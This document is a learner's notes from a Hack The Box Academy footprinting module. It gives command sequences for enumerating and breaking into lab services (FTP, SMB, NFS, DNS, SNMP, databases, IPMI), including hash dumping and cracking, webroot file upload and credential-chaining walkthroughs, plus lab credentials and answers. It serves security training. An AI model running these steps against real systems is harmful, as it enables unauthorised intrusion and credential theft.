## Host- Based Enumeration

```
## Dangerous settings

areaeric@htb[/htb]$ ftp 10.129.14.136
Name (10.129.14.136:cry0l1t3): anonymous
ftp> ls

ftp> status

ftp> debug
ftp> trace
ftp> ls

ftp> ls

ftp> ls -R

ftp> ls
ftp> get Important\ Notes.txt
ftp> exit
areaeric@htb[/htb]$ ls | grep Notes.txt

'Important Notes.txt'

areaeric@htb[/htb]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136

tree .

areaeric@htb[/htb]$ touch testupload.txt

ftp> put testupload.txt 
ftp> ls

## footprinting the service

areaeric@htb[/htb]$ sudo nmap --script-updatedb

areaeric@htb[/htb]$ find / -type f -name ftp* 2>/dev/null | grep scripts

areaeric@htb[/htb]$ sudo nmap -sV -p21 -sC -A 10.129.14.136

areaeric@htb[/htb]$ sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace

areaeric@htb[/htb]$ nc -nv 10.129.14.136 21
areaeric@htb[/htb]$ telnet 10.129.14.136 21

areaeric@htb[/htb]$ openssl s_client -connect 10.129.14.136:21 -starttls ftp

// Questions
1. nc 10.129.215.30
2. Follow sections: Dangerous settings
```


#### SMB
```
## Dangerous settings

areaeric@htb[/htb]$ smbclient -N -L //10.129.14.128

areaeric@htb[/htb]$ smbclient //10.129.14.128/notes
Enter WORKGROUP\<username>'s password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> help
smb: \> ls

smb: \> get prep-prod.txt 
smb: \> !ls
smb: \> !cat prep-prod.txt

root@samba:~# smbstatus

## Footprinting the Service

areaeric@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445

areaeric@htb[/htb]$ rpcclient -U "" 10.129.14.128
Enter WORKGROUP\'s password:
rpcclient $> 

rpcclient $> srvinfo		
rpcclient $> enumdomains
rpcclient $> querydominfo
rpcclient $> netshareenumall	
rpcclient $> netsharegetinfo notes

rpcclient $> enumdomusers
rpcclient $> queryuser 0x3e9
rpcclient $> queryuser 0x3e8

rpcclient $> querygroup 0x201

areaeric@htb[/htb]$ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

areaeric@htb[/htb]$ samrdump.py 10.129.14.128

areaeric@htb[/htb]$ smbmap -H 10.129.14.128

areaeric@htb[/htb]$ crackmapexec smb 10.129.14.128 --shares -u '' -p ''

areaeric@htb[/htb]$ git clone https://github.com/cddmp/enum4linux-ng.git
areaeric@htb[/htb]$ cd enum4linux-ng
areaeric@htb[/htb]$ pip3 install -r requirements.txt

areaeric@htb[/htb]$ ./enum4linux-ng.py 10.129.14.128 -A

## Qustions
1. sudo nmap 10.129.185.69 -p139,445 -sV
2. crackmapexec smb 10.129.185.69 --shares -u '' -p ''
3. Follow Dangerous setting sections
4. Follow Footprinting the Service, rpc client part (querydominfo)
5. crackmapexec smb 10.129.185.69 --shares -u '' -p '', remark section
6. netsharegetinfo sambashare, in rpcclient section
```

#### NFS
```
## Footprinting the Service

areaeric@htb[/htb]$ sudo nmap 10.129.14.128 -p111,2049 -sV -sC

areaeric@htb[/htb]$ sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

areaeric@htb[/htb]$ showmount -e 10.129.14.128

areaeric@htb[/htb]$ mkdir target-NFS
areaeric@htb[/htb]$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
areaeric@htb[/htb]$ cd target-NFS
areaeric@htb[/htb]$ tree .

areaeric@htb[/htb]$ ls -l mnt/nfs/

ls -n mnt/nfs/

areaeric@htb[/htb]$ cd ..
areaeric@htb[/htb]$ sudo umount ./target-NFS

## Questions
-> Follow section Footprinting the service and cat the flags
```

DNS
```
## General

areaeric@htb[/htb]$ dig soa www.inlanefreight.com

## Footprinting the service

areaeric@htb[/htb]$ dig ns inlanefreight.htb @10.129.14.128

areaeric@htb[/htb]$ dig CH TXT version.bind 10.129.120.85

areaeric@htb[/htb]$ dig any inlanefreight.htb @10.129.14.128

areaeric@htb[/htb]$ dig axfr inlanefreight.htb @10.129.14.128

areaeric@htb[/htb]$ dig axfr internal.inlanefreight.htb @10.129.14.128

areaeric@htb[/htb]$ for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done

areaeric@htb[/htb]$ dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb

## Questions
1. dig ns inlanefreight.htb @10.129.105.187
2. Follow section in footprinting the service
3. Read result obtained from zone transfer of internal.inlanefreight.htb.
4. - Perform dig ns query on dev/app/internal/mail1 inlanefreight.htb, only dev returned ns.dev.inlanefreight.htb returned some info, with ns.dev.inlanefreight.htb in 127.0.0.1
	- There is only one wordlist in /opt/SecLists/Discovery/DNS that has host list in front of the wordlist, that is the fierce-hostlist.txt.
	- Perform dns brute-forcing with fierce-hostlist.txt


Notes:
- One trick I could see is CNAME mixing in with subdomain brute force//zone transfer, this might allow some novel attacks.

sub.target.com.   60   IN   CNAME   anotherdomain.com
-> Then performing subdomain enumeration on anotherdomain.com or soething like that, but yet to be confirmed. 


- Script for zone transfer/dns server quering for subdomains:
find_axfr.sh in ~/Desktop/htb/notes/HTB_academy/exercise_related folder
find_axfr_multiple_subdomains.sh for multiple subdomain




a good post is listed here:
https://forum.hackthebox.com/t/active-subdomain-enumeration-htb-academy/250147/41
- Neat trick for querying A records: grep -Eo "[a-zA-Z0-9.-]+.$TARGET"

```

#### SMTP
```
bc = Have SMTP service to interact with

## Default Configuration

areaeric@htb[/htb]$ telnet 10.129.14.128 25
HELO mail1.inlanefreight.htb
EHLO mail1

areaeric@htb[/htb]$ telnet 10.129.14.128 25
VRFY root
VRFY cry0l1t3
VRFY testuser
VRFY aaaaaaaaaaaaaaaaaaaaaaaaaaaa

Note: Sometimes we may have to work through a web proxy. We can also make this web proxy connect to the SMTP server. The command that we would send would then look something like this: `CONNECT 10.129.14.128:25 HTTP/1.0`

areaeric@htb[/htb]$ telnet 10.129.14.128 25
EHLO inlanefreight.htb
MAIL FROM: <cry0l1t3@inlanefreight.htb>
RCPT TO: <mrb3n@inlanefreight.htb> NOTIFY=success,failure
QUIT

## Footprinting the Service

areaeric@htb[/htb]$ sudo nmap 10.129.14.128 -sC -sV -p25

areaeric@htb[/htb]$ sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v

## Questions
1. sudo nmap 10.129.61.171 -sC -sV -p25
   telnet 10.129.61.171 25
2. Follow section on Default configuration, vrfy users from footprinting user wordlist, robin will come back us with 252
```


#### IMAP/POP3
```shell-session

## Footprinting the Service

areaeric@htb[/htb]$ sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC

areaeric@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd

areaeric@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v

areaeric@htb[/htb]$ openssl s_client -connect 10.129.14.128:pop3s

areaeric@htb[/htb]$ openssl s_client -connect 10.129.14.128:imaps

## Questions

Q1/2: sudo nmap 10.129.61.171 -sV -p110,143,993,995 -sC
Q3: openssl s_client -connect 10.129.61.171:imaps
Q4: openssl s_client -connect 10.129.61.171:pop3s (look atbanner)
Q5/6: Use Q3, then:
	1 LIST "" *  
	1 SELECT DEV.DEPARTMENT.INT 
	1 FETCH 1 RFC822 
	- Note: RFC822 stands for clear text in internet text messages
	- Requires extra googling for syntax of imaps
```

#### SNMP
```
## Footprinting the Service

areaeric@htb[/htb]$ snmpwalk -v2c -c public 10.129.14.128

areaeric@htb[/htb]$ sudo apt install onesixtyone
areaeric@htb[/htb]$ onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128

areaeric@htb[/htb]$ sudo apt install braa
areaeric@htb[/htb]$ braa <community string>@<IP>:.1.3.6.*   # Syntax
areaeric@htb[/htb]$ braa public@10.129.14.128:.1.3.6.*

## Extra (on finding snmp)
- It's runs on udp port 161/162: sudo nmap 10.129.227.204 -sU -p161,162

## Questions
Q1/2: snmpwalk -v2c -c public 10.129.227.204
Q3: Same as Q1/2, but need to wait about 5 minutes. 
```

#### MySQL
```
## Footprinting the Service

areaeric@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*

areaeric@htb[/htb]$ mysql -u root -h 10.129.14.132

areaeric@htb[/htb]$ mysql -u root -pP4SSw0rd -h 10.129.14.128
MySQL [(none)]> show databases;                                           
MySQL [(none)]> select version();
MySQL [(none)]> use mysql;
MySQL [mysql]> show tables;

mysql> use sys;
mysql> show tables;  
mysql> select host, unique_users from host_summary;

## Questions
Q1: sudo nmap 10.129.227.204 -sV -sC -p3306 --script mysql*
Q2: Follow from section when logging in and use appropriate sql queries afterwards. 
```

#### MSSQL
```
## Footprinting the Service

areaeric@htb[/htb]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248

msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
rhosts => 10.129.201.248
msf6 auxiliary(scanner/mssql/mssql_ping) > run

areaeric@htb[/htb]$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
or 
mssqlclient.py Administrator@10.129.201.248 -windows-auth
SQL> select name from sys.databases

## Questions
Q1: Follow nmap script
Q2: Follow section on logging in
```

#### Oracle TNS
```
## Default Configuration

areaeric@htb[/htb]$ ./odat.py -h

areaeric@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open

areaeric@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

areaeric@htb[/htb]$ ./odat.py all -s 10.129.204.235

areaeric@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE

SQL> select table_name from all_tables;
SQL> select * from user_role_privs;

areaeric@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
SQL> select * from user_role_privs;

SQL> select name, password from sys.user$;

areaeric@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
areaeric@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

areaeric@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

## Questions
1. Follow directly from section, noting that the username and password is already given in the section.
```
#### IPMI
```shell-session
areaeric@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
msf6 auxiliary(scanner/ipmi/ipmi_version) > run

msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

## Questions
1. Follow section, then:
hashcat -m 7300 hash.txt /usr/share/wordlists/rockyou.txt
- note that remove spaces and all that.
```

## Skills assessment

#### Skills easy
```
sudo nmap 10.129.213.182 -sV
-> Found port 21/22/53/2121 open

- DNS had misconfigurtions (allows zone transfer) but didn't bring much

FTP at port 2121 revealed SSH keys, which can be used to login and get the flag
```

#### Skills medium
```
sudo nmap 10.129.202.41 -sV
-> 111,135,139,445,2049,3389 open

showmount -e 10.129.202.41

	mkdir target-NFS
	sudo mount -t nfs 10.129.135.240:/ ./target-NFS/ -o nolock
	cd target-NFS
	tree .

areaeric@htb[/htb]$ ls -l mnt/nfs/

ls -n mnt/nfs/

areaeric@htb[/htb]$ cd ..
areaeric@htb[/htb]$ sudo umount ./target-NFS


sudo nmap 10.129.202.41 -sV
-> Ports 111,135,139,445,2049,3389 open

showmount -e 10.129.135.240
mkdir target-NFS
sudo mount -t nfs 10.129.135.240:/ ./target-NFS/ -o nolock
cd target-NFS
ls
cat ticket4238791283782.txt 
-> get credential alex:lol123!mD

crackmapexec smb 10.129.135.240 --shares -u 'alex' -p 'lol123!mD'
smbclient -U "alex" \\\\10.129.135.240\\devshare
smb: \> get important.txt
smb: \> !cat important.txt
-> get credential sa:87N1ns@slls83

xfreerdp +bitmap-cache /network:auto /dynamic-resolution /compression-level:2 /u:alex /p:'lol123!mD' /v:10.129.135.240 /tls-seclevel:0 /timeout:80000
- Run sql as admin, with password 87N1ns@slls83
- Observe data structure: 
	-> Cick on Databases-> accounts -> Tables -> dbo.devsacc
- Add new Query: 
	- > use accounts;
		select * from dbo.devsacc where name = 'HTB';
	-> get credential HTB:lnch7ehrdn43i7AoqVPK4zWR
```

#### Skills hard
```
sudo nmap 10.129.202.20 -sU (generally do this)
sudo nmap 10.129.202.20 -sU -p53,161,162,623
sudo nmap 10.129.202.20 -sU -sV -p161
-> SNMP v3 service opened

sudo nmap 10.129.202.20 
sudo nmap 10.129.202.20 -p22,110,143,993,995 -sV
-> IMAP/POP3 opened


snmpwalk -v3 -c public 10.129.202.20 
onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt 10.129.202.20
-> Community string: 10.129.202.20 [backup]: Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64

braa backup@10.129.202.20:.1.3.6.* 
-> Used Pwn box and try for 5-20 times, obtained credential: tom:NMds732Js2761

openssl s_client -connect 10.129.202.20:imaps

1 LOGIN tom NMds732Js2761
1 LIST "" *
1 SELECT Inbox
1 FETCH 1 RFC822
-> Obtain ssh keys for user tom (yank it! v, y and pasting is ctrl + b ])
chmod 600 id_rsa

ssh tom@10.129.202.20 -i id_rsa
netstat -tunlp
-> SQL service open on port 3306 locally

mysql -u tom -pNMds732Js2761 -h 127.0.0.1
MySQL [(none)]> show databases;                                           
MySQL [(none)]> use users;
MySQL [(none)]> describe users;
MySQL [mysql]> select * from users where username = 'HTB';
-> Obtained credentials  150 | HTB | cr3n4o7rzse7rzhnckhssncif7ds 
```












